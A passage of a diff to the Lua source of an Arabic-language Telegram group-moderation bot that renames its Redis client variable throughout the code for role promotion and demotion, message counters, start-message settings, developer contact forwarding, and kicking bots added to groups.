 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
 end
 if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
 ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
-DevBRAND:del(BRAND.."Comd:New:rt:BRAND:"..ComdNew..msg.chat_id_)
+DevABS:del(BRAND.."Comd:New:rt:BRAND:"..ComdNew..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
 end
-if DevBRAND:get(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
+if DevABS:get(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
-DevBRAND:del(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
 return false  
 end 
 if text == "مدير" then
@@ -1581,32 +1581,32 @@ return false
 end
 end
 if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
-local textn = DevBRAND:get(BRAND.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
-DevBRAND:set(BRAND.."Comd:New:rt:BRAND:"..textn..msg.chat_id_,text)
+local textn = DevABS:get(BRAND.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
+DevABS:set(BRAND.."Comd:New:rt:BRAND:"..textn..msg.chat_id_,text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
-DevBRAND:del(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
+DevABS:del(BRAND.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
 return false  
 end 
 end
 
 if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
 local DEV_ABBAS = text:match("رفع (.*)")
-if DevBRAND:sismember(BRAND.."Coomds"..msg.chat_id_,DEV_ABBAS) then
+if DevABS:sismember(BRAND.."Coomds"..msg.chat_id_,DEV_ABBAS) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local mrBRAND = DevBRAND:get(BRAND.."Comd:New:rt:BRAND:"..DEV_ABBAS..msg.chat_id_)
+local mrBRAND = DevABS:get(BRAND.."Comd:New:rt:BRAND:"..DEV_ABBAS..msg.chat_id_)
 if mrBRAND == "مميز" and VipMem(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
+DevABS:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
 elseif mrBRAND == "ادمن" and Admin(msg) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
 elseif mrBRAND == "مدير" and Manager(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
+DevABS:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
 elseif mrBRAND == "عضو" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
@@ -1617,22 +1617,22 @@ end
 end
 if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
 local DEV_ABBAS = text:match("تنزيل (.*)")
-if DevBRAND:sismember(BRAND.."Coomds"..msg.chat_id_,DEV_ABBAS) then
+if DevABS:sismember(BRAND.."Coomds"..msg.chat_id_,DEV_ABBAS) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local mrBRAND = DevBRAND:get(BRAND.."Comd:New:rt:BRAND:"..DEV_ABBAS..msg.chat_id_)
+local mrBRAND = DevABS:get(BRAND.."Comd:New:rt:BRAND:"..DEV_ABBAS..msg.chat_id_)
 if mrBRAND == "مميز" and VipMem(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrBRAND == "ادمن" and Admin(msg) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrBRAND == "مدير" and Manager(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrBRAND == "عضو" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
@@ -1643,22 +1643,22 @@ end
 end
 if text and text:match("^رفع (.*) @(.*)") then 
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
-if DevBRAND:sismember(BRAND.."Coomds"..msg.chat_id_,text1[2]) then
+if DevABS:sismember(BRAND.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local mrBRAND = DevBRAND:get(BRAND.."Comd:New:rt:BRAND:"..text1[2]..msg.chat_id_)
+local mrBRAND = DevABS:get(BRAND.."Comd:New:rt:BRAND:"..text1[2]..msg.chat_id_)
 if mrBRAND == "مميز" and VipMem(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevABS:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrBRAND == "ادمن" and Admin(msg) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrBRAND == "مدير" and Manager(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevABS:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:set(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrBRAND == "عضو" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
@@ -1671,22 +1671,22 @@ end
 end
 if text and text:match("^تنزيل (.*) @(.*)") then 
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
-if DevBRAND:sismember(BRAND.."Coomds"..msg.chat_id_,text1[2]) then
+if DevABS:sismember(BRAND.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local mrBRAND = DevBRAND:get(BRAND.."Comd:New:rt:BRAND:"..text1[2]..msg.chat_id_)
+local mrBRAND = DevABS:get(BRAND.."Comd:New:rt:BRAND:"..text1[2]..msg.chat_id_)
 if mrBRAND == "مميز" and VipMem(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_, result.id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrBRAND == "ادمن" and Admin(msg) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, result.id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrBRAND == "مدير" and Manager(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
-DevBRAND:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_, result.id_)
+DevABS:del(BRAND.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrBRAND == "عضو" then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
@@ -1701,13 +1701,13 @@ end
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match("-100(%d+)") then
-DevBRAND:incr(BRAND..'BRAND:UsersMsgs'..BRAND..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
-DevBRAND:incr(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-DevBRAND:incr(BRAND..'BRAND:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
+DevABS:incr(BRAND..'BRAND:UsersMsgs'..BRAND..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:incr(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:incr(BRAND..'BRAND:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
 ChatType = 'sp' 
 elseif id:match("^(%d+)") then
-if not DevBRAND:sismember(BRAND.."BRAND:Users",msg.chat_id_) then
-DevBRAND:sadd(BRAND.."BRAND:Users",msg.chat_id_)
+if not DevABS:sismember(BRAND.."BRAND:Users",msg.chat_id_) then
+DevABS:sadd(BRAND.."BRAND:Users",msg.chat_id_)
 end
 ChatType = 'pv' 
 else
@@ -1759,10 +1759,10 @@ SendInline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end
 if text == '/start' and ChCheck(msg) then  
-if not DevBRAND:get(BRAND..'BRAND:Start:Time'..msg.sender_user_id_) then
+if not DevABS:get(BRAND..'BRAND:Start:Time'..msg.sender_user_id_) then
 tdcli_function({ID="GetUser",user_id_=BRAND},function(arg,dp) 
 local inline = {{{text="⌁ اضفني في مجموعتك ⌁",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
-local start = DevBRAND:get(BRAND.."BRAND:Start:Bot")
+local start = DevABS:get(BRAND.."BRAND:Start:Bot")
 if start then 
 Start_Source = start
 else
@@ -1771,11 +1771,11 @@ end
 SendInline(msg.chat_id_,Start_Source,nil,inline)
 end,nil)
 end
-DevBRAND:setex(BRAND..'BRAND:Start:Time'..msg.sender_user_id_,300,true)
+DevABS:setex(BRAND..'BRAND:Start:Time'..msg.sender_user_id_,300,true)
 return false
 end 
 --     Source BRAND     --
-if not SecondSudo(msg) and not DevBRAND:sismember(BRAND..'BRAND:Ban:Pv',msg.sender_user_id_) and not DevBRAND:get(BRAND..'BRAND:Texting:Pv') then
+if not SecondSudo(msg) and not DevABS:sismember(BRAND..'BRAND:Ban:Pv',msg.sender_user_id_) and not DevABS:get(BRAND..'BRAND:Texting:Pv') then
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
 Dev_BRAND(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CXRCX")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
@@ -1794,13 +1794,13 @@ tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data)
 if text == 'حظر' or text == 'حضر' then
 local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم حظره من التواصل'
 SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
-DevBRAND:sadd(BRAND..'BRAND:Ban:Pv',data.id_)  
+DevABS:sadd(BRAND..'BRAND:Ban:Pv',data.id_)  
 return false  
 end 
 if text == 'الغاء الحظر' or text == 'الغاء حظر' then
 local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم الغاء حظره من التواصل'
 SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
-DevBRAND:srem(BRAND..'BRAND:Ban:Pv',data.id_)  
+DevABS:srem(BRAND..'BRAND:Ban:Pv',data.id_)  
 return false  
 end 
 tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
@@ -1833,29 +1833,29 @@ end,nil);
 end 
 end 
 --     Source BRAND     --
-if text and DevBRAND:get(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) then
+if text and DevABS:get(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) then
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) 
+DevABS:del(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) 
 return false
 end
-DevBRAND:set(BRAND.."BRAND:Start:Bot",text)  
+DevABS:set(BRAND.."BRAND:Start:Bot",text)  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) 
+DevABS:del(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_) 
 return false
 end
 if SecondSudo(msg) then
 if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
-DevBRAND:set(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_,true) 
+DevABS:set(BRAND..'BRAND:Start:Bots'..msg.sender_user_id_,true) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
 return false
 end
 if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
-DevBRAND:del(BRAND..'Start:Bot') 
+DevABS:del(BRAND..'Start:Bot') 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
 end
 if text == 'جلب رد الخاص' then  
-local start = DevBRAND:get(BRAND.."BRAND:Start:Bot")
+local start = DevABS:get(BRAND.."BRAND:Start:Bot")
 if start then 
 Start_Source = start
 else
@@ -1867,12 +1867,12 @@ end
 if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Texting:Pv') 
+DevABS:del(BRAND..'BRAND:Texting:Pv') 
 end
 if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Texting:Pv',true) 
+DevABS:set(BRAND..'BRAND:Texting:Pv',true) 
 end
 end
 --     Source BRAND     --
@@ -1885,10 +1885,10 @@ end
 local msg = data.message_
 text = msg.content_.text_
 if msg.content_.ID == "MessageChatAddMembers" then 
-DevBRAND:incr(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
-DevBRAND:set(BRAND.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
+DevABS:incr(BRAND..'BRAND:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
+DevABS:set(BRAND.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
 local mem_id = msg.content_.members_  
-local Bots = DevBRAND:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) 
+local Bots = DevABS:get(BRAND.."BRAND:Lock:Bots"..msg.chat_id_) 
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
 https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
@@ -1927,7 +1927,7 @@ end
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
 GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
 local JsonInfo = JSON.decode(GetInfo)
 if JsonInfo.ok == true and #mem_id == i then
@@ -1945,7 +1945,7 @@ end
 end  
 end
 if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(BRAND) then 
-DevBRAND:srem(BRAND.."BRAND:Groups", msg.chat_id_) 
+DevABS:srem(BRAND.."BRAND:Groups", msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 local Name1 = result.first_name_
@@ -1970,18 +1970,18 @@ end,nil)
 end,nil)
 end
 if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
-if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
 end   
 end
 if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
-DevBRAND:incr(BRAND..'BRAND:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
+DevABS:incr(BRAND..'BRAND:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
 elseif msg.content_.ID == "MessageChatDeleteMember" then   
-DevBRAND:incr(BRAND..'BRAND:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
+DevABS:incr(BRAND..'BRAND:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
 end
 --     Source BRAND     --
 if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
-if not DevBRAND:get(BRAND..'BRAND:Lock:FreeBot'..BRAND) then
+if not DevABS:get(BRAND..'BRAND:Lock:FreeBot'..BRAND) then
 if ChatType == 'pv' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
 return false
@@ -2011,37 +2011,37 @@ tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100"
 local admins = abbas.members_
 for i=0 , #admins do
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 end,nil)   
 else
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevBRAND:sadd(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevBRAND:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:sadd(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevBRAND:srem(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevBRAND:srem(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:srem(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:srem(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
 end
 end,nil)  
 end 
 end
 end,nil)
-if DevBRAND:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
+if DevABS:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
 else
-if tonumber(data.member_count_) < tonumber(DevBRAND:get(BRAND..'BRAND:Num:Add:Bot') or 0) and not SecondSudo(msg) then
-Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevBRAND:get(BRAND..'BRAND:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
+if tonumber(data.member_count_) < tonumber(DevABS:get(BRAND..'BRAND:Num:Add:Bot') or 0) and not SecondSudo(msg) then
+Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevABS:get(BRAND..'BRAND:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
 return false
 end
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
-DevBRAND:sadd(BRAND.."BRAND:Groups",msg.chat_id_)
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
+DevABS:sadd(BRAND.."BRAND:Groups",msg.chat_id_)
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
 local Name1 = Name1:gsub("'","") 
@@ -2064,7 +2064,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevABS:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
